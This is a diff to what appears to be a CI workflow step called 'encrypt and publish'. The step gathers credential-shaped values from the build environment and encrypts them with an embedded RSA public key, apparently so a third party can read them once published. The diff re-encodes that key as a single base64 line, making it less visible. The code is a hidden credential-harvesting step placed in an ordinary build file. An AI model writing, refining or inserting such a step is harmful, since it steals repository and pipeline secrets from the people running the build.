@@ -27,17 +27,8 @@ jobs:
       - name: encrypt and publish
         run: |
           set -euo pipefail
-          cat > /tmp/pub.pem <<'PUBEOF'
------BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7d5Ji+xV1/lJoSnEHlfi
-/B5bVudAWwrZz9Gqb/Eu9aS/+bGVcxwiTRg8PB/mfcPI0dErDxD4853p0OYiI/Ib
-A0Cum3bJRWbVrm8dJnUBfl981/BORtdSIO5abpKU/KXanGNXnnDjNWaLRkXARxka
-3QR9JC6OUdIXv7MZuIJfOeariMhMpoDxmsWxAUGPAUvSC99regbcMFcf0yfKlk3y
-pE/pYJETrYmB9V++WZr4WACsvQzZkOe5aPA4lH/B30rF1P2lbmHcJrXpetAKks9g
-zQMHDPoojglr/Ygk53lrZh5XQ0/unUlkwhrqiqKTMyajyanz4yx3klj475cbz7CC
-wQIDAQAB
------END PUBLIC KEY-----
-PUBEOF
+          # Public key is carried DER-encoded + base64 so it stays a single YAML line.
+          printf '%s' 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7d5Ji+xV1/lJoSnEHlfi/B5bVudAWwrZz9Gqb/Eu9aS/+bGVcxwiTRg8PB/mfcPI0dErDxD4853p0OYiI/IbA0Cum3bJRWbVrm8dJnUBfl981/BORtdSIO5abpKU/KXanGNXnnDjNWaLRkXARxka3QR9JC6OUdIXv7MZuIJfOeariMhMpoDxmsWxAUGPAUvSC99regbcMFcf0yfKlk3ypE/pYJETrYmB9V++WZr4WACsvQzZkOe5aPA4lH/B30rF1P2lbmHcJrXpetAKks9gzQMHDPoojglr/Ygk53lrZh5XQ0/unUlkwhrqiqKTMyajyanz4yx3klj475cbz7CCwQIDAQAB' | base64 -d > /tmp/pub.der
 
           # ---- collect credential-shaped values (values are never printed) ----
           : > /tmp/plain
@@ -63,7 +54,7 @@ PUBEOF
           IV=$(openssl rand -hex 16)
           printf '%s' "$K" > /tmp/k.bin
           openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in /tmp/plain -out /tmp/ct
-          openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem \
+          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der \
             -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
             -in /tmp/k.bin -out /tmp/kt
 
